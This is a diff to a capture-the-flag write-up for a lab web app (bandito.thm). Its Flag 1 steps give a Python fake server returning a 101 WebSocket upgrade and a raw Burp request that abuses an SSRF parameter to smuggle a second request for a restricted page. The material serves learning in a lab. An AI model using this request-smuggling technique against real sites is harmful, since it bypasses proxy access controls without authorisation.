@@ -27,6 +27,42 @@ tags: Web App Security
 <img width="717" height="642" alt="Screenshot 2026-03-13 013426" src="https://github.com/user-attachments/assets/1f2d62f9-5e3a-41ca-9a71-557099bb092f" />
 
 ## Flag 1
-- There is a potential SSRF vulnerability on `services.html`
+1. Set up a fake server that always responds `101 Switching Protocol` status code `nano server.py` 
+
+```
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class FakeWebSocketHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(101)  # Fake successful upgrade
+        self.send_header('Upgrade', 'websocket')
+        self.send_header('Connection', 'Upgrade')
+        self.end_headers()
+
+server = HTTPServer(('0.0.0.0', 5555), FakeWebSocketHandler)
+print("[+] Fake WebSocket server running on port 5555")
+server.serve_forever()
+```
+
+2. Start the listener `python3 server.py`
+4. Intercept a request to the home page -> send it to **Repeater**
+5. Paste the following request payload to the **Repeater** (Make sure to leave two new lines at the end)
+
+```
+GET /isOnline?url=http://10.65.84.87:5555 HTTP/1.1
+Host: bandito.thm:8080
+Sec-WebSocket-Extensions: permessage-deflate
+Sec-WebSocket-Key: 0FUnln2Ue4zNvQoqFC2sPw==
+Connection: Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+Content-Length: 0
+
+GET /burn.html HTTP/1.1
+Host: bandito.thm:8080
 
 
+```
+
+6. Disable the "Update Content-Length" feature on Burp Suites.
